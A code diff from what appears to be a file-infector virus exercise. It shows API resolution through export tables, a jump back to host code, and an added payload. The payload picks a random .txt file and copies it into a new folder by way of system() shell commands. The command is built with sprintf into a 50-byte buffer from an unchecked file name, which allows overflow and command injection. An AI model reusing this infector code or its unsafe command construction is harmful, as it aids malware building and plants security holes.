@@ -12,6 +12,9 @@
 
 #define EXE_FILE_NAME "hallo_welt.exe"
 
+#define CALL(function) goto function 
+#define RET(function) goto function##_ret 
+
 // ==========
 typedef HMODULE (*tLoadLibraryA)(LPCSTR);
 typedef FARPROC (*tGetProcAddress)(HMODULE, LPCSTR);
@@ -84,30 +87,24 @@ const char empty_str[] = "";
         FUNCTION(puts)(msg);
     }
 
-    task1(pGetProcAddress, msvcrt_hModule, i_ex_dir, image_base);
+    // task1(pGetProcAddress, msvcrt_hModule, i_ex_dir, image_base);
+    CALL(task1);
+task1_ret:
+    asm("nop");
 
     // ===========================================
     #if 0
     // File 
 
-
-// typedef FILE *(*t_fopen)(const char *,const char *);
-// typedef size_t (*t_fwrite)(const void *, size_t, size_t, FILE *);
-// char s_fopen[] = "fopen";
-// char s_fwrite[] = "fwrite";
-
-// char mode[] = "w";
-// FILE* got = FUNCTION(fopen)(dest_path, mode);
-
-
-
     // GetModuleFileNameW
     typedef FILE *(*t_fopen)(const char *,const char *);
     typedef size_t (*t_fread)(void *, size_t, size_t, FILE *);
+    typedef size_t (*t_fwrite)(const void *, size_t, size_t, FILE *);
     typedef int (*t_fseek)(FILE *, long, int);
     typedef int (*t_fclose)(FILE *);
     char s_fopen[] = "fopen";
     char s_fread[] = "fread";
+    char s_fwrite[] = "fwrite";
     char s_fseek[] = "fseek";
     char s_fclose[] = "fclose";
 
@@ -149,8 +146,8 @@ const char empty_str[] = "";
 // done
 
 // go back to host code
-    char back_msg[] = "Going back...";
-    FUNCTION(puts)(back_msg);
+char back_msg[] = "Going back...";
+FUNCTION(puts)(back_msg);
 
     list = list->Flink;
     void *current_image_base = *((void**)((void*)list + 0x20));
@@ -168,6 +165,67 @@ const char empty_str[] = "";
         :"rax"
     );
 
+    task1:
+    {
+    // typedef int (*t_puts)(const char *);
+    // char s_puts[] = "puts";
+    // const char empty_str[] = ""; 
+
+        typedef HANDLE (*tFindFirstFileA) (LPCSTR, LPWIN32_FIND_DATAA);
+        typedef WINBOOL (*tFindNextFileA) (HANDLE, LPWIN32_FIND_DATAA);
+        typedef WINBOOL (*tFindClose) (HANDLE);
+        char sFindFirstFileA[] = "FindFirstFileA";
+        char sFindNextFileA[] = "FindNextFileA";
+        char sFindClose[] = "FindClose";
+
+        typedef void (*t_srand)(unsigned int);
+        typedef int (*t_rand)(void);
+        typedef time_t (*t_time)(time_t *);
+        char s_srand[] = "srand";
+        char s_rand[] = "rand";
+        char s_time[] = "time";
+
+        typedef char *(*t_strcpy)(char *, const char *);
+        char s_strcpy[] = "strcpy";
+
+        typedef int(*t_system)(LPCSTR);
+        typedef int(*t_sprintf)(char *, const char *,...);
+        char s_system[] = "system";
+        char s_sprintf[] = "sprintf";
+        
+        WIN32_FIND_DATA findFileData;
+        char param[] = "*.*"; 
+        HANDLE hFind = K32_FUNCTION(FindFirstFileA)(param, &findFileData);
+
+        char suffix[] = ".txt";
+        char txt_file_name[MAX_PATH];
+        FUNCTION(srand)(FUNCTION(time)(NULL));
+        do 
+        {
+            // FUNCTION(puts)(findFileData.cFileName);
+            if (match_suffix(findFileData.cFileName, suffix))
+            {
+                FUNCTION(strcpy)(txt_file_name, findFileData.cFileName);
+                if(FUNCTION(rand)()%2)
+                {
+                    break;
+                } 
+            }
+        } while (K32_FUNCTION(FindNextFileA)(hFind, &findFileData) != 0);
+        K32_FUNCTION(FindClose)(hFind);
+
+        char mkdir_cmd[] = "mkdir v_folder";
+        FUNCTION(system)(mkdir_cmd);
+
+        char cpy_cmd[50];
+        char cpy_fomat[] = "copy %s %s > NUL";
+        char dest_path[] = ".\\v_folder\\2021302181087.txt";
+        FUNCTION(sprintf)(cpy_cmd, cpy_fomat, txt_file_name, dest_path);
+        FUNCTION(system)(cpy_cmd);
+        RET(task1);
+    }
+
+     
 }
 
 IMAGE_EXPORT_DIRECTORY *get_IMAGE_EXPORT_DIRECTORY(void *image_base)
